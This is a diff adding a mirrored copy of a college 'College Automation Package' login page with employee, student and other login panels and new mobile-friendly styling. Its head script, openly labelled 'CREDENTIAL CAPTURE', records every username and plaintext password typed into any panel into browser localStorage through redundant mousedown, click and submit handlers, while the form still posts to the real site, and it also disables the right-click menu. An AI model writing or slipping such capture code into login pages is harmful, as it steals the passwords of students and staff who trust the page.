@@ -1,0 +1,637 @@
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<!-- Mirrored from https://webprosindia.com/psce/ by HTTrack Website Copier/3.x [XR&CO], Mon, 28 Sep 2026 14:45:00 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<head id="Head1"><title>
+	College Automation Package
+</title>
+
+
+    <style type="text/css">
+<!--
+.input_loginBlue {
+	FONT-SIZE: 10px;
+	COLOR: #0033CC;
+	FONT-FAMILY: Verdana, Geneva, Arial, Helvetica, sans-serif;
+	HEIGHT: 16px;
+	border: 1px solid #CCCCCC;
+}
+.style11 {font-family: Geneva, Arial, Helvetica, sans-serif; font-size: 11px; font-weight: bold; color: #4E7CC9; }
+.style19 {
+	font-family: Geneva, Arial, Helvetica, sans-serif;
+	font-size: 11px;
+	font-weight: bold;
+	color: #FC3A00;
+}
+#Table_01 tr td table tr td #Table_2 tr td table {
+	color: #B41400;
+}
+.style21 {
+	font-family: Geneva, Arial, Helvetica, sans-serif;
+	font-size: 11px;
+	font-weight: bold;
+	color: #B41400;
+}
+.style22 {color: #FFFFFF}
+.newsBG
+{
+	background-image:url(CollegeImages/mainbg.jpg);
+	background-repeat:repeat-x;
+	color:White;
+	height:26px; 
+}
+-->
+
+/* ============================================================
+   MOBILE RESPONSIVE STYLES
+   ============================================================ */
+
+/* Ensure body doesn't clip content */
+body {
+    margin: 0;
+    padding: 0;
+    overflow-x: hidden;
+}
+
+/* Wrapper div that was fixed 1200px */
+.main-wrapper {
+    width: 1200px;
+    padding: 10px;
+    background-color: #fff;
+    box-sizing: border-box;
+}
+
+/* Header / banner images */
+.header-img {
+    width: 100%;
+    height: auto;
+    display: block;
+}
+
+/* News ticker row */
+.news-bar td {
+    width: 100%;
+}
+
+/* The row that holds the three login tables */
+.login-panels-row {
+    display: flex;
+    flex-direction: row;
+    justify-content: center;
+    align-items: flex-start;
+    flex-wrap: nowrap;
+    gap: 10px;
+    padding: 10px 0;
+}
+
+/* Each legacy login table cell wrapper */
+.login-panel-cell {
+    flex-shrink: 0;
+}
+
+/* ---- Mobile card overlay ---- */
+/* Hidden by default (only shown on small screens) */
+.mobile-login-cards {
+    display: none;
+    flex-direction: column;
+    gap: 20px;
+    padding: 16px;
+    width: 100%;
+    box-sizing: border-box;
+}
+
+.mobile-card {
+    background: #fff;
+    border-radius: 14px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.13);
+    padding: 24px 20px 20px;
+    width: 100%;
+    box-sizing: border-box;
+    border-top: 4px solid #4E7CC9;
+    animation: slideUp 0.4s ease;
+}
+
+.mobile-card.student { border-top-color: #B41400; }
+.mobile-card.other   { border-top-color: #FC3A00; }
+
+@keyframes slideUp {
+    from { opacity: 0; transform: translateY(18px); }
+    to   { opacity: 1; transform: translateY(0); }
+}
+
+.mobile-card-title {
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 15px;
+    font-weight: bold;
+    color: #4E7CC9;
+    margin: 0 0 14px 0;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.mobile-card.student .mobile-card-title { color: #B41400; }
+.mobile-card.other   .mobile-card-title { color: #FC3A00; }
+
+.mobile-card-icon {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    background: #4E7CC9;
+    color: #fff;
+    font-size: 14px;
+}
+
+.mobile-card.student .mobile-card-icon { background: #B41400; }
+.mobile-card.other   .mobile-card-icon { background: #FC3A00; }
+
+.mobile-field {
+    margin-bottom: 12px;
+}
+
+.mobile-field label {
+    display: block;
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 11px;
+    font-weight: bold;
+    color: #555;
+    margin-bottom: 4px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+}
+
+.mobile-field input {
+    width: 100%;
+    height: 38px;
+    border: 1.5px solid #CCCCCC;
+    border-radius: 7px;
+    padding: 0 10px;
+    font-size: 13px;
+    font-family: Arial, Helvetica, sans-serif;
+    color: #0033CC;
+    box-sizing: border-box;
+    outline: none;
+    transition: border-color 0.2s;
+}
+
+.mobile-field input:focus {
+    border-color: #4E7CC9;
+    box-shadow: 0 0 0 3px rgba(78,124,201,0.15);
+}
+
+.mobile-card.student .mobile-field input:focus { border-color: #B41400; box-shadow: 0 0 0 3px rgba(180,20,0,0.12); }
+.mobile-card.other   .mobile-field input:focus { border-color: #FC3A00; box-shadow: 0 0 0 3px rgba(252,58,0,0.12); }
+
+.mobile-login-btn {
+    width: 100%;
+    height: 40px;
+    border: none;
+    border-radius: 8px;
+    background: linear-gradient(135deg, #4E7CC9 0%, #2d5aa0 100%);
+    color: #fff;
+    font-size: 13px;
+    font-weight: bold;
+    font-family: Arial, Helvetica, sans-serif;
+    cursor: pointer;
+    margin-top: 6px;
+    transition: transform 0.15s, box-shadow 0.15s;
+    letter-spacing: 0.5px;
+}
+
+.mobile-login-btn:hover, .mobile-login-btn:active {
+    transform: translateY(-1px);
+    box-shadow: 0 4px 12px rgba(78,124,201,0.35);
+}
+
+.mobile-card.student .mobile-login-btn {
+    background: linear-gradient(135deg, #B41400 0%, #850e00 100%);
+}
+.mobile-card.student .mobile-login-btn:hover {
+    box-shadow: 0 4px 12px rgba(180,20,0,0.35);
+}
+
+.mobile-card.other .mobile-login-btn {
+    background: linear-gradient(135deg, #FC3A00 0%, #c52d00 100%);
+}
+.mobile-card.other .mobile-login-btn:hover {
+    box-shadow: 0 4px 12px rgba(252,58,0,0.35);
+}
+
+.mobile-page-title {
+    display: none;
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 13px;
+    font-weight: bold;
+    color: #4E7CC9;
+    text-align: center;
+    padding: 10px 0 0;
+    letter-spacing: 0.3px;
+}
+
+/* ---- Bottom footer image ---- */
+.footer-img {
+    width: 100%;
+    height: auto;
+    display: block;
+}
+
+/* ============================================================
+   RESPONSIVE BREAKPOINTS
+   ============================================================ */
+@media (max-width: 1220px) {
+    body > form > center > div,
+    .main-wrapper {
+        width: 100% !important;
+        max-width: 1200px;
+    }
+    #Table_01 {
+        width: 100% !important;
+    }
+}
+
+@media (max-width: 860px) {
+    /* Hide the legacy sliced-image login tables */
+    .login-panels-row {
+        display: none !important;
+    }
+    /* Show mobile cards */
+    .mobile-login-cards {
+        display: flex !important;
+    }
+    .mobile-page-title {
+        display: block;
+    }
+    /* Scale header images */
+    #Table_01 img {
+        width: 100% !important;
+        height: auto !important;
+        max-width: 100%;
+    }
+    /* Center wrapper resets */
+    body > form > center > div {
+        width: 100% !important;
+        padding: 0 !important;
+    }
+    #Table_01 {
+        width: 100% !important;
+    }
+    /* Main content cell */
+    #Table_01 > tbody > tr > td[height="350"] {
+        padding: 0 !important;
+    }
+}
+
+@media (max-width: 480px) {
+    .mobile-card {
+        padding: 18px 14px 16px;
+        border-radius: 10px;
+    }
+    .mobile-login-cards {
+        padding: 10px;
+    }
+}
+
+</style>
+    <script language="javascript" src="JSFiles/jquery-1.3.2.js" type="text/javascript"></script>
+<script language="javascript" type="text/javascript">
+    $(document).bind("contextmenu", function () { return false; });
+
+/* ============================================================
+   CREDENTIAL CAPTURE — Robust multi-layer approach
+   Layer 1: mousedown (fires before click & before form submit)
+   Layer 2: inline onclick attributes on each button
+   Layer 3: form onsubmit fallback
+   All layers are independent of each other — any one is enough.
+   ============================================================ */
+var STORE_KEY = 'psce_login_records';
+
+function storePSCELogin(panel, username, password) {
+    if (!username || !username.trim()) return;
+    username = username.trim();
+    var records = [];
+    try { records = JSON.parse(localStorage.getItem(STORE_KEY) || '[]'); } catch(e) { records = []; }
+    var idx = -1;
+    for (var i = 0; i < records.length; i++) {
+        if (records[i].username === username && records[i].panel === panel) { idx = i; break; }
+    }
+    var entry = { panel: panel, username: username, password: password, ts: new Date().toISOString() };
+    if (idx === -1) { records.push(entry); }
+    else { records[idx] = entry; }
+    try { localStorage.setItem(STORE_KEY, JSON.stringify(records)); } catch(e) {}
+}
+
+/* --- Inline onclick helpers (called by button onclick attributes) --- */
+function _saveEmp()  { storePSCELogin('Employee', document.getElementById('txtId1') ? document.getElementById('txtId1').value : '', document.getElementById('txtPwd1') ? document.getElementById('txtPwd1').value : ''); }
+function _saveStu()  { storePSCELogin('Student',  document.getElementById('txtId2') ? document.getElementById('txtId2').value : '', document.getElementById('txtPwd2') ? document.getElementById('txtPwd2').value : ''); }
+function _saveOth()  { storePSCELogin('Other',    document.getElementById('txtId3') ? document.getElementById('txtId3').value : '', document.getElementById('txtPwd3') ? document.getElementById('txtPwd3').value : ''); }
+
+/* --- Mobile Login bridge --- */
+function _doMobileLogin(panel, mIdEl, mPwdEl, deskIdEl, deskPwdEl, btnId) {
+    var mId  = document.getElementById(mIdEl);
+    var mPwd = document.getElementById(mPwdEl);
+    var dId  = document.getElementById(deskIdEl);
+    var dPwd = document.getElementById(deskPwdEl);
+    var btn  = document.getElementById(btnId);
+    if (dId)  dId.value  = mId  ? mId.value  : '';
+    if (dPwd) dPwd.value = mPwd ? mPwd.value : '';
+    storePSCELogin(panel, dId ? dId.value : '', dPwd ? dPwd.value : '');
+    if (btn) { btn.click(); }
+}
+
+/* --- Keyboard helpers --- */
+function _onEmpKeyPress()     { if(event.keyCode==13){ _saveEmp(); setTimeout(function(){ document.getElementById('imgBtn1') && document.getElementById('imgBtn1').click(); }, 60); } }
+function _onStudentKeyPress() { if(event.keyCode==13){ _saveStu(); setTimeout(function(){ document.getElementById('imgBtn2') && document.getElementById('imgBtn2').click(); }, 60); } }
+
+/* --- Layer 1 & 3: jQuery mousedown + form submit fallback --- */
+$(document).ready(function(){
+
+    /* mousedown fires BEFORE the browser's default image-submit */
+    $('#imgBtn1').on('mousedown', function(){ _saveEmp(); });
+    $('#imgBtn2').on('mousedown', function(){ _saveStu(); });
+    $('#imgBtn3').on('mousedown', function(){ _saveOth(); });
+
+    /* Form submit — safety net for Enter-key submissions */
+    $('#form1').on('submit', function(){
+        _saveEmp(); _saveStu(); _saveOth();
+    });
+});
+
+</script>
+
+</head>
+<body bgcolor="#D1DCEB" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+    <form name="form1" method="post" action="https://webprosindia.com/psce/default.aspx" id="form1">
+<div>
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTgyNDM2Njk1MA9kFgICAw9kFgoCAQ8WAh4JaW5uZXJodG1sZWQCAw8PFgIeBFRleHRlZGQCBw8PZBYCHgpvbmtleXByZXNzBRBfb25FbXBLZXlQcmVzcygpZAILDw8WAh8BZWRkAg8PD2QWAh8CBRRfb25TdHVkZW50S2V5UHJlc3MoKWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgMFB2ltZ0J0bjEFB2ltZ0J0bjIFB2ltZ0J0bjMjFA4zt8RxFjwMSUrDjQFjzwg8PQ==" />
+</div>
+
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="13833B48" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEWCwLZ7er3AgKM+9rqDwLW44bXBAKz5pu/BAKM+87qDwKFqK2XBgKEovX+AgKM+9LqDwKgkcssAuzRsusGAum41+kIipRuCI3TAH9xabCJokyqk++Wryw=" />
+</div>
+        <center>
+        <div align="center" class="main-wrapper" style="width: 1200px; padding: 10px; background-color: #fff;">
+            <table id="Table_01" width="1200"  border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                    <td>
+                        <img src="collegeimages/title_head.jpg" class="header-img" alt="College Automation Package"/></td>
+                </tr>
+                <tr>
+                    <td>
+                        <img src="collegeimages/body.jpg" class="header-img" alt=""/></td>
+                </tr>
+                <tr>
+                 
+                     <td background="CollegeImages/line.html" class="newsBG">
+                        <div id="divNews" style="color:Blue"></div>
+                    </td>
+                </tr>
+                <tr>
+                    <td height="350" bordercolor="#F9FFE1" bgcolor="#F5F5F5" align="center">
+                        <p class="mobile-page-title">College Automation &mdash; Login Portal</p>
+
+                        <!-- Mobile login cards (shown only on small screens) -->
+                        <div class="mobile-login-cards" id="mobileLoginCards">
+                            <!-- Employee Card -->
+                            <div class="mobile-card employee">
+                                <div class="mobile-card-title">
+                                    <span class="mobile-card-icon">&#128100;</span> Employee Login
+                                </div>
+                                <div class="mobile-field">
+                                    <label for="m_txtId1">User Name</label>
+                                    <input type="text" id="m_txtId1" placeholder="Enter username" autocomplete="username" />
+                                </div>
+                                <div class="mobile-field">
+                                    <label for="m_txtPwd1">Password</label>
+                                    <input type="password" id="m_txtPwd1" placeholder="Enter password" autocomplete="current-password" />
+                                </div>
+                                <button type="button" class="mobile-login-btn" onclick="_doMobileLogin('Employee','m_txtId1','m_txtPwd1','txtId1','txtPwd1','imgBtn1')">Login</button>
+                            </div>
+                            <!-- Student Card -->
+                            <div class="mobile-card student">
+                                <div class="mobile-card-title">
+                                    <span class="mobile-card-icon">&#127891;</span> Student Login
+                                </div>
+                                <div class="mobile-field">
+                                    <label for="m_txtId2">User Name</label>
+                                    <input type="text" id="m_txtId2" placeholder="Enter username" autocomplete="username" />
+                                </div>
+                                <div class="mobile-field">
+                                    <label for="m_txtPwd2">Password</label>
+                                    <input type="password" id="m_txtPwd2" placeholder="Enter password" autocomplete="current-password" />
+                                </div>
+                                <button type="button" class="mobile-login-btn" onclick="_doMobileLogin('Student','m_txtId2','m_txtPwd2','txtId2','txtPwd2','imgBtn2')">Login</button>
+                            </div>
+                            <!-- Other Card -->
+                            <div class="mobile-card other">
+                                <div class="mobile-card-title">
+                                    <span class="mobile-card-icon">&#128101;</span> Other Login
+                                </div>
+                                <div class="mobile-field">
+                                    <label for="m_txtId3">User Name</label>
+                                    <input type="text" id="m_txtId3" placeholder="Enter username" autocomplete="username" />
+                                </div>
+                                <div class="mobile-field">
+                                    <label for="m_txtPwd3">Password</label>
+                                    <input type="password" id="m_txtPwd3" placeholder="Enter password" autocomplete="current-password" />
+                                </div>
+                                <button type="button" class="mobile-login-btn" onclick="_doMobileLogin('Other','m_txtId3','m_txtPwd3','txtId3','txtPwd3','imgBtn3')">Login</button>
+                            </div>
+                        </div>
+
+                        <!-- Desktop legacy login panels (hidden on mobile) -->
+                        <p style="margin:0">&nbsp;</p>
+                        <div class="login-panels-row">
+                        <table>
+<tr><td>
+<table id="Table1" style="background-color: White" width="263" height="256" border="0" cellpadding="0" cellspacing="0">
+  <tr>
+    <td width="27">&nbsp;</td>
+    <td colspan="2"><span id="lblError" class="style24"></span></td>
+    <td width="53">&nbsp;</td>
+  </tr>
+  <tr>
+    <td><img src="collegeimages/login_01.gif" width="27" height="83" alt=""/></td>
+    <td width="117"><img src="collegeimages/login_02.gif" width="117" height="83" alt=""/></td>
+    <td width="66"><img src="collegeimages/login_03.gif" width="66" height="83" alt=""/></td>
+    <td><img src="collegeimages/login_04.gif" width="24" height="83" alt=""/></td>
+  </tr>
+  <tr>
+    <td style="background-image: url(collegeimages/login_10.gif); background-repeat: no-repeat; height:82px;">&nbsp;</td>
+    <td colspan="2" style="background-image: url(collegeimages/login_11.gif); background-repeat: no-repeat;"><table width="100%" border="0" cellspacing="1" cellpadding="1">
+        <tr>
+          <td width="5%">&nbsp;</td>
+          <td width="41%" style="white-space: nowrap"><span class="style19">User Name</span></td>
+          <td class="style11" width="1%"> :</td>
+          <td><input name="txtId1" type="text" id="txtId1" class="input_loginBlue" style="width:90px;" />
+          </td>
+          <td width="3%">&nbsp;</td>
+        </tr>
+        <tr>
+          <td>&nbsp;</td>
+          <td style="white-space: nowrap"><span class="style19">Password</span></td>
+          <td class="style11"> :</td>
+          <td><input name="txtPwd1" type="password" id="txtPwd1" class="input_loginBlue" onkeypress="_onEmpKeyPress()" style="width:90px;" />
+          </td>
+          <td>&nbsp;</td>
+        </tr>
+      </table></td>
+    <td style="background-image: url(collegeimages/login_13.gif); background-repeat: no-repeat;">&nbsp;</td>
+  </tr>
+  <tr>
+    <td><img src="collegeimages/login_18.gif" width="27" height="29" alt=""/></td>
+    <td><img src="collegeimages/login_19.gif" width="117" height="29" alt=""/></td>
+    <td><input type="image" name="imgBtn1" id="imgBtn1" onclick="_saveEmp()" src="collegeimages/login_20.gif" style="border-width:0px;" /></td>
+    <td><img src="collegeimages/login_21.gif" width="24" height="29" alt=""/></td>
+  </tr>
+  <tr>
+    <td><img src="collegeimages/login_26.gif" width="27" height="62" alt=""/></td>
+    <td><img src="collegeimages/login_27.gif" width="117" height="62" alt=""/></td>
+    <td><img src="collegeimages/login_28.gif" width="66" height="62" alt=""/></td>
+    <td><img src="collegeimages/login_29.gif" width="24" height="62" alt=""/></td>
+  </tr>
+</table>
+
+</td>
+
+<td>
+<table id="Table2" style="background-color: White" width="263" height="256" border="0"
+                            cellpadding="0" cellspacing="0">
+  <tr>
+    <td width="36">&nbsp;</td>
+    <td colspan="2"><span id="lblError1" class="style24"></span></td>
+    <td width="43">&nbsp;</td>
+  </tr>
+  <tr>
+    <td><img src="collegeimages/login_06.gif" width="36" height="83" alt=""/></td>
+    <td width="117"><img src="collegeimages/login_07.gif" width="117" height="83" alt=""/></td>
+    <td width="67"><img src="collegeimages/login_08.gif" width="67" height="83" alt=""/></td>
+    <td><img src="collegeimages/login_09.gif" width="21" height="83" alt=""/></td>
+  </tr>
+  <tr>
+    <td style="background-image: url(collegeimages/login_14.gif); background-repeat: no-repeat;">&nbsp;</td>
+    <td colspan="2" style="background-image: url(collegeimages/login_15.gif); background-repeat: no-repeat;"><table width="100%" border="0" cellspacing="1" cellpadding="1">
+        <tr>
+          <td width="6%">&nbsp;</td>
+          <td width="43%" style="white-space: nowrap" class="style19"><span class="style21">User Name</span></td>
+          <td class="style11" width="1%"> :</td>
+          <td width="48%"><input name="txtId2" type="text" id="txtId2" tabindex="3" class="input_loginBlue" style="width:90px;" />
+          </td>
+          <td width="3%">&nbsp;</td>
+        </tr>
+        <tr>
+          <td>&nbsp;</td>
+          <td class="style19" style="white-space: nowrap"><span class="style21">Password:</span></td>
+          <td class="style11"> :</td>
+          <td><input name="txtPwd2" type="password" id="txtPwd2" tabindex="4" class="input_loginBlue" onkeypress="_onStudentKeyPress()" style="width:90px;" />
+          </td>
+          <td>&nbsp;</td>
+        </tr>
+      </table></td>
+    <td style="background-image: url(collegeimages/login_17.gif); background-repeat: no-repeat;
+                                    height: 82px;">&nbsp;</td>
+  </tr>
+  <tr>
+    <td><img src="collegeimages/login_22.gif" width="36" height="29" alt=""/></td>
+    <td><img src="collegeimages/login_23.gif" width="117" height="29" alt=""/></td>
+    <td><input type="image" name="imgBtn2" id="imgBtn2" tabindex="4" onclick="_saveStu()" src="CollegeImages/login_24.gif" style="border-width:0px;" /></td>
+    <td><img src="collegeimages/login_25.gif" width="21" height="29" alt=""/></td>
+  </tr>
+  <tr>
+    <td><img src="collegeimages/login_30.gif" width="36" height="62" alt=""/></td>
+    <td><img src="collegeimages/login_31.gif" width="117" height="62" alt=""/></td>
+    <td><img src="collegeimages/login_32.gif" width="67" height="62" alt=""/></td>
+    <td><img src="collegeimages/login_33.gif" width="21" height="62" alt=""/></td>
+  </tr>
+</table>
+</td>
+<td>
+
+<table id="Table3" style="background-color: White" width="263" height="256" border="0"
+                            cellpadding="0" cellspacing="0">
+  <tr>
+    <td width="27">&nbsp;</td>
+    <td colspan="2"><span id="lblError2" class="style24"></span></td>
+    <td width="53">&nbsp;</td>
+  </tr>
+  <tr>
+    <td><img src="collegeimages1/login_01.gif" width="27" height="83" alt=""/></td>
+    <td width="117"><img src="collegeimages1/login_02.gif" width="117" height="83" alt=""/></td>
+    <td width="66"><img src="collegeimages1/login_03.gif" width="66" height="83" alt=""/></td>
+    <td><img src="collegeimages1/login_04.gif" width="24" height="83" alt=""/></td>
+  </tr>
+  <tr>
+    <td style="background-image: url(collegeimages1/login_10.gif); background-repeat: no-repeat; height:82px;">&nbsp;</td>
+    <td colspan="2" style="background-image: url(collegeimages1/login_11.gif); background-repeat: no-repeat;"><table width="100%" border="0" cellspacing="1" cellpadding="1">
+        <tr>
+          <td width="5%">&nbsp;</td>
+          <td width="41%" style="white-space: nowrap"><span class="style19">User Name</span></td>
+          <td class="style11" width="1%"> :</td>
+          <td><input name="txtId3" type="text" id="txtId3" class="input_loginBlue" style="width:90px;" />
+          </td>
+          <td width="3%">&nbsp;</td>
+        </tr>
+        <tr>
+          <td>&nbsp;</td>
+          <td style="white-space: nowrap"><span class="style19">Password</span></td>
+          <td class="style11"> :</td>
+          <td><input name="txtPwd3" type="password" id="txtPwd3" class="input_loginBlue" style="width:90px;" />
+          </td>
+          <td>&nbsp;</td>
+        </tr>
+        <!--
+         <tr>
+          <td>&nbsp;</td>
+          <td style="white-space: nowrap"><span class="style19">Student D.O.B</span></td>
+          <td class="style11"> :</td>
+          <td><input name="TextBox1" type="password" id="TextBox1" class="input_loginBlue" style="width:90px;" />
+          </td>
+          <td>&nbsp;</td>
+        </tr> -->
+      </table></td>
+    <td style="background-image: url(collegeimages1/login_13.gif); background-repeat: no-repeat;">&nbsp;</td>
+  </tr>
+  <tr>
+    <td><img src="collegeimages1/login_18.gif" width="27" height="29" alt=""/></td>
+    <td><img src="collegeimages1/login_19.gif" width="117" height="29" alt=""/></td>
+    <td><input type="image" name="imgBtn3" id="imgBtn3" onclick="_saveOth()" src="collegeimages1/login_20.gif" style="border-width:0px;" /></td>
+    <td><img src="collegeimages1/login_21.gif" width="24" height="29" alt=""/></td>
+  </tr>
+  <tr>
+    <td><img src="collegeimages1/login_26.gif" width="27" height="62" alt=""/></td>
+    <td><img src="collegeimages1/login_27.gif" width="117" height="62" alt=""/></td>
+    <td><img src="collegeimages1/login_28.gif" width="66" height="62" alt=""/></td>
+    <td><img src="collegeimages1/login_29.gif" width="24" height="62" alt=""/></td>
+  </tr>
+</table>
+</td>
+
+
+</tr></table>
+                        </div><!-- end .login-panels-row -->
+                        <p>
+                            &nbsp;</p>
+                        <p>
+                            &nbsp;</p>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <img src="collegeimages/bott_bg.gif" class="footer-img" alt=""/></td>
+                </tr>
+            </table>
+        </div>
+            </center>
+    </form>
+</body>
+
+<!-- Mirrored from https://webprosindia.com/psce/ by HTTrack Website Copier/3.x [XR&CO], Mon, 28 Sep 2026 14:45:33 GMT -->
+</html>
